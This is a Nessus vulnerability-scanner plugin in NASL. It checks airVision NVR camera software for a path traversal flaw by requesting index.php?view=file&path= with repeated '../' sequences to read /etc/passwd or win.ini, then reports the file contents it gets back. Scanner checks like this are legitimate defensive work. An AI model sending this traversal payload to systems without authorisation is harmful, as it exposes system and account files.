#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64994);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/02/03 20:48:27 $");

  script_bugtraq_id(55921);
  script_osvdb_id(86252);
  script_xref(name:"EDB-ID", value:"21990");

  script_name(english:"airVision NVR path Parameter Traversal Arbitrary File Access");
  script_summary(english:"Attempts to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts an application that is affected by a
directory traversal vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts airVision NVR, an application used to
remotely monitor IP cameras.  The installed version of airVision NVR
fails to properly sanitize user-supplied input to the 'path' parameter
of the 'views/file.php' script.  This could allow an unauthenticated,
remote attacker to read arbitrary files on the remote host by sending a
request containing directory traversal characters. 

Note that the application is reportedly also affected by a SQL injection
vulnerability as well as an additional traversal arbitrary file
disclosure vulnerability via the 'path' parameter of the
'views/image.php' script; however, Nessus has not tested for these
additional issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.ubnt.com/airvision");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:ubnt:airvision_firmware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 7079);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:7079, embedded:TRUE);

# Check if airVision NVR is installed
res = http_get_cache(
  item         : "/",
  port         : port,
  exit_on_fail : TRUE
);

if ("<title>airVision NVR" >!< res) audit(AUDIT_WEB_APP_NOT_INST, "airVision NVR", port);

# Grab version and add to KB
version = UNKNOWN_VER;
matches = eregmatch(pattern:"airVision NVR v(.+)<", string:res);
if (!isnull(matches)) version = matches[1];

installs = add_install(
  dir      : "/",
  appname  : 'airVision NVR',
  ver      : version,
  port     : port
);

install_url = build_url(qs:"/", port:port);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  attack = "index.php?view=file&path=" + mult_str(str:"../", nb:12) + file;

  res2 = http_send_recv3(
    method       : "GET",
    item         : "/" + attack,
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res2[2]))
  {
    # Limit output to 15 lines
    count = 0;
    output = "";
    foreach line (split(res2[2]))
    {
      output += line;
      count++;
      if (count >= 15) break;
    }

    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\nNessus was able to exploit the issue to retrieve the contents of '+
        '\n'+ "'" + file + "'" + ' using the following request :' +
        '\n' +
        '\n' + install_url + attack+
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following truncated output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(output) +
          '\n' + snip +
          '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "airVision NVR", install_url);
